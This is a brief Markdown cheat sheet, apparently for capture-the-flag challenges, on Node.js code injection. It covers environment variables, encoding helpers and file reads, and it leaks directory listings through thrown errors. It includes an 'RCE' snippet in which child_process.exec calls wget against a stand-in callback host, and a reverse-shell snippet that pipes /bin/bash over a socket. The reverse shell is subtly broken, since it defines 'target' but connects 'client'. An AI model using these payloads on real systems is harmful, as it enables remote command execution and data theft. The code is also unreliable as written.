
# Strings

```js
1 + '1' = '11'
```

# Tools

- `proces`
- `fs`
- `child_process` 
- `ncat`

# Variables

```js
process.title
process.argv0
process.version
process.cwd()
process.pid
process.platform
__filename
```

# Helpers

Encode a string as decimal (each letter split by 000)
```js
"blob".split('').map(char => char.charCodeAt(0)).join(' ');
// "98 108 111 98"
```

Encode a char at a given index as decimal
```js
"blob".split('')[1].charCodeAt()
// 108
"blob".split('')[25].charCodeAt()
// TypeError: "blob".split(...)[25] is undefined
```

List a directory
```js
require('fs').readdirSync('./').toString()
```

Read a file content
```js
require('fs').readFileSync('./flag.txt').toString()
```

Define a function and call it
```js
(()=>{return 3*3})()           // anonymous function
function x(){return 3*3;} x(); // named function
```

Throw an error
```js
throw "this is a bad error message"
throw `${JSON.stringify(require('fs').readdirSync("."))}`
```

RCE
```js
require('child_process').exec('wget http://XXXXXX.hook.com')
require('child_process').execSync('wget http://XXXXXX.hook.com')
```

Reverse shell
```js
var net = require("net");
var target = new net.Socket();
client.connect(1234, "127.0.0.1", function()
	{
		target.pipe(require("child_process").exec("/bin/bash").stdin);
		require("child_process").exec("/bin/bash").stdout.pipe(target);
		require("child_process").exec("/bin/bash").stderr.pipe(target);
	}
);
```
# Resources

- https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44